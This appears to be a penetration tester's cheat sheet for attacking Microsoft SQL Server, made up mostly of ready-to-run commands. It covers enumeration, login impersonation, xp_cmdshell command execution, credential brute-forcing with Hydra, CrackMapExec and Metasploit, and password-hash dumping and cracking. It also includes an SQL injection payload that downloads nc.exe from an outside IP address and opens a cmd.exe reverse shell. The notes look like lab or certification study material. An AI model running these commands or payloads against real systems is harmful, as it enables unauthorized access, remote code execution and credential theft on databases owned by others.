```table-of-contents
```
**Microsoft SQL Server (MSSQL)** is a **relational database management system** (RDBMS) commonly used in enterprise environments. It operates over **TCP port 1433** and is frequently targeted due to **misconfigurations, weak credentials, and privilege escalation opportunities**. Compromising MSSQL can lead to **data exfiltration, lateral movement, and remote code execution**.
## Common Attack Vectors

- **Weak or Default Credentials** – Many MSSQL instances use weak or default credentials (`sa:password`).
- **XP_CmdShell Execution** – Enables **remote OS command execution**.
- **SQL Injection (SQLi) for Privilege Escalation** – Exploiting web applications that interact with MSSQL.
- **Linked Server Enumeration & Exploitation** – Lateral movement through **trusted MSSQL instances**.

https://www.offensive-security.com/metasploit-unleashed/admin-mssql-auxiliary-modules  
[https://github.com/fortra/impacket](https://github.com/fortra/impacket)
## Enumeration
### Check for Open MSSQL Ports
```bash
nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config <target-ip>
```

---
## User Impersonation
If you are able to log into MSSQL with a user who has low privileges, you may be able to impersonate another user with higher privileges. First, use the following to print a table of users to impersonate:
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  
```

If any results come back, attempt to login:
```sql
EXECUTE AS LOGIN = 'user'
```

Reference: [[Hokkaido#MSSQL]]

---
## RCE via MSSQL
If **authentication is obtained**, execute **remote commands**.
Impacket:
```bash
impacket-mssqlclient 'DOMAIN/username':'password'@<target-ip> -windows-auth
```

Run OS commands:
```sql
xp_cmdshell 'whoami';
```

Using CrackMapExec:
```bash
crackmapexec mssql <target-ip> -u sa -p password --exec "whoami"
```

---
## Authentication Attacks
### Brute-Force Credentials
Hydra:
```bsah
hydra -L users.txt -P passwords.txt mssql://<target-ip> -V
```

CrackMapExec:
```bash
crackmapexec mssql <target-ip> -u users.txt -p passwords.txt
```

MSF:
```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---
## Exploiting Misconfigurations
### MSSQL Command Execution via `xp_cmdshell`
If you have **sysadmin** privileges, enable `xp_cmdshell` to execute system-level commands:
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Reverse Shell via MSSQL
If SQL Injection is discovered on a target, use the following payload to enable command execution via `xp_cmdshell`, download `nc.exe`, and obtain a reverse shell.
```sql
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.196:8000/nc.exe C:\users\public\nc.exe';
EXEC xp_cmdshell 'C:\users\public\nc.exe 192.168.45.196 9005 -e cmd.exe';--
```
* Bring `nc.exe` into the terminal window to obtain the shell, then start python server.
* URL encode payload and send.

### Reverse Shell via Encoded Powershell
First, create a payload from https://revshells.com using PowerShell #3 (Base64)

---
## Extracting Credentials from MSSQL
### Dumping User Creds
```sql
SELECT name, password_hash FROM sys.sql_logins;
```
### Extracting NTLM Hashes
MSF:
```bash
msfconsole
use auxiliary/admin/mssql/mssql_hashdump
set RHOSTS <target-ip>
set USERNAME sa
set PASSWORD <password>
run
```

### Cracking MSSQL Hashes
```bash
hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
```

---
## Dumping MSSQL Password Hashes
Using Metasploit:
```bash
use auxiliary/admin/mssql/mssql_hashdump
set RHOSTS <target-ip>
set USERNAME sa
set PASSWORD <password>
run
```

Hashes can be cracked using Hashcat:
```bash
hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
```

---
## Quick Command References
List all databases:
```sql
SELECT name FROM master..sysdatabases;
```

List all tables within database:
```sql
USE database_name;
SELECT name FROM sysobjects WHERE xtype='U';
```

Dump table data:
```sql
SELECT * FROM table_name;
```

